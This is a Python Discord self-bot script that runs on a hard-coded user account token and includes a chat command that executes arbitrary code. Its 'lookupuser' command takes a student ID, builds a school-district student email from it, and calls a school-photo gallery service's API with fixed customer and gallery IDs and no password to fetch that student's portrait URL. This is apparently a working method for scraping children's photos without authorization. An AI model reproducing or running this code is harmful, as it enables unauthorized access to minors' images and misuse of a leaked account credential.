import discord
from discord.ext import commands
import asyncio
import requests
import json

bot = commands.Bot(command_prefix="!", self_bot=True, intents=discord.Intents.all())
bot.remove_command('help')

@bot.event
async def on_ready():
    print("READY")

async def aexec(code, ctx):
    # Make an async function with the code and `exec` it
    exec(
        f'async def __ex(ctx): ' +
        ''.join(f'\n {l}' for l in code.split('\n'))
    )

    # Get `__ex` from local variables, call it and return the result
    return await locals()['__ex'](ctx)
# @bot.event
# async def on_message(msg):
#     if msg.guild.id == 933205819963629588:
#         print(msg.author)
#         print(msg.content)
#     await bot.process_commands(msg)

@bot.command()
async def eval(ctx, *, cmd):
    print("E")
    # await ctx.message.delete()
    cmd = cmd.replace('`', "").replace("py", "")
    print(cmd)
    print("e")
    try:
        await aexec(cmd, ctx)
    except Exception as e:
        await ctx.send(f"ERR: '{e}'")
        pass
    except:
        await ctx.send("ERR")
        pass
    await aexec(cmd, ctx)

@bot.command()
async def lookupuser(ctx, userid):
    NUMBER = userid
    CUSTID = "Z964Y97"
    GALLERYID = "1000868102"
    EMAIL = f"{NUMBER}@student.pasco.k12.fl.us"

    s = requests.Session()

    payload = {
    "keyword": NUMBER,
    "code": NUMBER
    }
    s.get("https://vando.imagequix.com/rest/customer/Z964Y97/gallery", data=payload)

    payload = {
    "custID": CUSTID,
    "galleryID": GALLERYID,
    "email": EMAIL,
    "password": None,
    "subjectCode": NUMBER
    }
    req = s.post("https://vando.imagequix.com/rest/visitor", json=payload)
    data = json.loads(req.content)
    TOKEN = data["visitor"]["token"]
    SUBJECTID = data["visit"]["subjectID"]
    STUDENTID = data["visitor"]["id"]


    req=s.get(f"https://vando.imagequix.com/rest/gallery/{GALLERYID}/load/{SUBJECTID}")
    img = json.loads(req.content)["imageData"]["categories"][0]["primaryImage"]
    await ctx.send(f"https://api.imagequix.com/ondemand/{CUSTID}/gallery/{GALLERYID}/600/{img}")


bot.run("mfa.gRFhJ8wwVnW2_E8LAYWVaiyBUYZ4VQz13kVH4_LrQavr6X6l0JXEeRQD4JCisrcQzp4_psyayNK2qDQ_4zAM", bot=False)